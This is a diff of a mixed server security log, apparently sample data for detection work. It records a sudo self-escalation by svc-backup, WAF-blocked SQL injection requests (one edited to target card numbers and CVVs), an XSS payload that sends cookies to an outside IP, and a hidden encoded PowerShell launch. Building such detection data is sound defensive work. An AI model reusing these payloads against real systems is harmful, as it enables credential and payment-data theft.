@@ -18,7 +18,7 @@ Jul  7 09:18:09 web-prod-01 sudo[3502]: svc-backup : TTY=pts/1 ; PWD=/home/svc-b
 Jul  7 09:18:31 web-prod-01 sudo[3508]: svc-backup : TTY=pts/1 ; PWD=/home/svc-backup ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc-backup
 Jul  7 09:19:02 web-prod-01 auth[3521]: user svc-backup added to administrators group by uid=0
 2026-07-07 09:21:17 ERROR webapp request GET /products?id=1 UNION SELECT username,password FROM users -- from 198.51.100.23 blocked by WAF rule sqli-001
-2026-07-07 09:21:44 ERROR webapp request GET /search?q=test' OR 1=1 -- from 198.51.100.23 blocked by WAF rule sqli-002
+2026-07-07 09:21:44 ERROR webapp request GET /search?id=2 UNION SELECT card_number,cvv FROM payments -- from 198.51.100.23 blocked by WAF rule sqli-002
 2026-07-07 09:22:30 ERROR webapp request POST /comments body contains <script>document.location='http://198.51.100.23/c?'+document.cookie</script> from 198.51.100.23 blocked by WAF rule xss-001
 2026-07-07 09:24:05 WARNING checkout-api order=88233 status=payment_declined amount=740.00 retry=1
 Jul  7 09:27:12 win-dc-02 sysmon: EventID=1 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine="powershell.exe -nop -w hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0" User=CORP\svc-backup
